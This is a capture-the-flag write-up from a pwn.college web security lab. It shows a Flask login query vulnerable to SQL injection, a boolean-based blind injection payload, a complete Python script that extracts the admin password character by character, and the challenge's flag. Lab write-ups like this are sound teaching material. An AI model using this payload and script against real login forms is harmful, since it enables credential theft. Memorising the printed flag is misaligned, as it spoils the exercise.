---
layout: page
title: "SQL Injection 5 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🧠 Challenge Summary

We are presented with a Flask app that allows login via POST request. It stores an `admin` user in an SQLite database with the **flag as their password**.

The login query is:

```python
query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{password}'"
```
This is a classic case of SQL Injection due to unsanitized input being directly used in the query string.
---

## Exploit
The SQL statement can be injected through the password field.
We'll perform a boolean-based blind SQLi using the substr() function to extract the flag character-by-character.

The injection payload looks like this:
```
' OR substr((SELECT password FROM users WHERE username='admin'),{i},1)='{c}' --
```
This returns True when the {i}-th character of the flag is {c}.

A successful login results in an HTTP 302 redirect, which we use as a success signal.

### Exploit Script
```
import requests
import string

url = "http://challenge.localhost/"
charset = string.printable  # or use more targeted sets

flag = ""
for i in range(1, 100):  # assume max flag length
    for c in charset:
        payload = f"' OR substr((SELECT password FROM users WHERE username='admin'),{i},1)='{c}' -- "
        r = requests.post(
            url,
            data={"username": "admin", "password": payload},
            allow_redirects=False
        )
        if r.status_code == 302:
            flag += c
            print(f"[+] Found char at position {i}: {c} → {flag}")
            break
    else:
        print("[!] No match found. End of flag?")
        break

print("\n[✔] Full flag:", flag)
```
---

## Extracted Flag
```bash
pwn.college{sF5mGoRwC83HASVmK1umN_te4al.QXzkzMzwSM0IzMyEzW}
```

---
